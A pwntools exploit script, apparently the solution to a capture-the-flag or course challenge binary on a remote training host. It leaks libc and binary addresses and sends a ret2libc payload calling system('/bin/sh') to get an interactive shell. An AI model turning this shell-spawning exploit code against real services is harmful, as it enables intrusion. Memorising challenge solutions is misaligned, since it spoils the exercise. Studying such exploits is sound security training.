#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 9002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, LIBC
    
    # with context.local(log_level='error'):
    if args.REMOTE:
        P = remote(HOST, PORT)
    elif args.GDB:
        P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")
    LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6')

######################################
############## Exploit ###############
######################################

def yes():
    P.sendlineafter(b'(y/n)\n', b'y')

def exploit():
    yes()
    P.recvuntil(b'current favourite is: ')
    puts = int(P.recvline()[:-1], 16) 
    log.info(f'puts Address: {hex(puts)}')

    LIBC.address = puts - LIBC.symbols['puts']
    log.info(f'LIBC Base @ {hex(LIBC.address)}')

    yes()
    P.sendline(b'0')
    alignment_offset = 8
    small_payload = b'A' * alignment_offset + p64(0) + p64(LIBC.symbols['system']) + p64(0) + p64(next(LIBC.search(b'/bin/sh\00')))
    P.sendline(small_payload)
    yes()
    P.recvuntil(b'Mine is: ')
    get_number = int(P.recvline()[:-1], 16)
    log.info(f'get_number Address: {hex(get_number)}')
    P.sendline(b'4')

    binary_base = get_number - int(0x1221)
    log.info(f"Binary Base @: {hex(binary_base)}")
    
    payload = b'A' * 0xd0
    P.sendline(payload)
    # P.sendline(b'1')

    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
